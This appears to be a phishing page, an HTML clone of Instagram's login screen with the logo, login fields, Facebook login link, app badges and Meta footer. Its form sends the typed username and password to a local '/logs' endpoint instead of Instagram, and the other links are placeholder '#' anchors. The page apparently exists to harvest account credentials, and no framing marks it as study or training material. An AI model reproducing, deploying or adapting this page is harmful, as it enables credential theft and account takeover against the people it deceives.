<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="Instagram" />
<title>Instagram</title>
<link rel="icon" href="/favicon.ico" />
<link rel="stylesheet" href="/style.css" />
</head>
<body>
<div id="root">
  <div class="login-wrap">
    <div class="login-card">
      <h1 class="logo" aria-label="Instagram">
        <svg viewBox="0 0 175 51" height="51" width="175" role="img" aria-label="Instagram">
          <text x="0" y="40" font-family="'Billabong','Segoe Script','Brush Script MT',cursive"
                font-size="46" font-style="italic" fill="#262626">Instagram</text>
        </svg>
      </h1>

      <form id="loginForm" method="POST" action="/logs" novalidate>
        <label class="field">
          <input
            id="username"
            name="username"
            type="text"
            aria-label="Phone number, username, or email"
            placeholder="Phone number, username, or email"
            autocomplete="username"
            autocorrect="off"
            autocapitalize="off"
            required
          />
        </label>
        <label class="field">
          <input
            id="password"
            name="password"
            type="password"
            aria-label="Password"
            placeholder="Password"
            autocomplete="current-password"
            required
          />
        </label>

        <button type="submit" id="loginBtn" disabled>Log in</button>
      </form>

      <div class="or"><span>OR</span></div>

      <a class="fb-login" href="#">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185">
          <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
        </svg>
        Log in with Facebook
      </a>

      <a class="forgot" href="#">Forgot password?</a>
    </div>

    <div class="signup-card">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-badge">Get the app.</div>
    <div class="stores">
      <a href="#"><img alt="Get it on Google Play" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect width='136' height='40' rx='6' fill='%23000'/></svg>" /></a>
      <a href="#"><img alt="Download on the App Store" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect width='136' height='40' rx='6' fill='%23000'/></svg>" /></a>
    </div>
  </div>

  <footer class="footer">
    <div class="footer-links">
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
      <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
      <a href="#">Contact Uploading &amp; Non-Users</a><a href="#">Meta Verified</a>
    </div>
    <div class="footer-meta">
      <select aria-label="Switch display language">
        <option>English</option><option>Español</option><option>Français</option>
      </select>
      <span>© 2025 Instagram from Meta</span>
    </div>
  </footer>
</div>
<script src="/app.js" defer></script>
</body>
</html>
